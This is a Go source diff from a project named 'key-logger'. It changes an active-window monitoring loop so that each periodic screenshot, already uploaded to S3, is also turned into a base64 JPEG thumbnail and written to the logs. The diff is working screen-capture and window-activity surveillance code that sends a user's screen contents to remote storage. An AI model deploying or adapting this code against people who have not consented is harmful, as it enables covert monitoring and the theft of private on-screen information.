@@ -1,8 +1,11 @@
 package window
 
 import (
+	"bytes"
+	"encoding/base64"
 	"fmt"
 	"image"
+	"image/jpeg"
 	"regexp"
 	"sync"
 	"sync/atomic"
@@ -14,6 +17,7 @@ import (
 	"github.com/go-kit/kit/log/level"
 	"github.com/gonutz/w32/v2"
 	"github.com/kbinani/screenshot"
+	"golang.org/x/image/draw"
 
 	"key-logger/pkg/model"
 	"key-logger/pkg/s3"
@@ -28,6 +32,8 @@ var (
 	setProcessDpiAwarenessProc = shellscaling.NewProc("SetProcessDpiAwareness")
 	kernel32                   = syscall.NewLazyDLL("kernel32.dll")
 	getTickCountProc           = kernel32.NewProc("GetTickCount")
+
+	EightyFivePercent = jpeg.Options{Quality: 85}
 )
 
 func setProcessDpiAwarenessContext() bool {
@@ -159,12 +165,16 @@ func (w *Window) logLastInputInfoLoop() {
 				im.Location = fmt.Sprintf("caps/%d/%d/%d/%d_%s.jpg", now.Year(), now.Month(), now.Day(), now.Unix(), w.cleanRegex.ReplaceAllString(win, ""))
 				im.Image = img
 				w.s3.Send(im)
+
+				dst := image.NewRGBA(image.Rect(0, 0, 640, 360))
+				draw.CatmullRom.Scale(dst, dst.Rect, img, img.Bounds(), draw.Over, nil)
+				buf := &bytes.Buffer{}
+				jpeg.Encode(buf, dst, &EightyFivePercent)
+				b64Str := base64.StdEncoding.EncodeToString(buf.Bytes())
+				imageLoc := fmt.Sprintf("%s/%s/%s", w.s3.GetEndpoint(), w.s3.GetBucket(), im.Location)
+				level.Info(w.logger).Log("ts", time.Now(), "type", "screen-cap", "loc", imageLoc, "thumb", b64Str)
 			}
-			imageLoc := ""
-			if im.Location != "" {
-				imageLoc = fmt.Sprintf("%s/%s/%s", w.s3.GetEndpoint(), w.s3.GetBucket(), im.Location)
-			}
-			level.Info(w.logger).Log("ts", time.Now(), "type", "active-window", "window", win, "process", proc, "image", imageLoc)
+			level.Info(w.logger).Log("ts", time.Now(), "type", "active-window", "window", win, "process", proc)
 		}
 		time.Sleep(5 * time.Second)
 	}
@@ -175,12 +185,5 @@ func (w *Window) logLastInputInfoLoop() {
 func save(img *image.RGBA, filePath string) {
 
 	//// Make thumbnail
-	//dst := image.NewRGBA(image.Rect(0, 0, 640, 360))
-	//draw.CatmullRom.Scale(dst, dst.Rect, img, img.Bounds(), draw.Over, nil)
-	//tn, err := os.Create("t_" + filePath)
-	//if err != nil {
-	//	panic(err)
-	//}
-	//defer tn.Close()
-	//jpeg.Encode(tn, dst, &EightyFivePercent)
+
 }
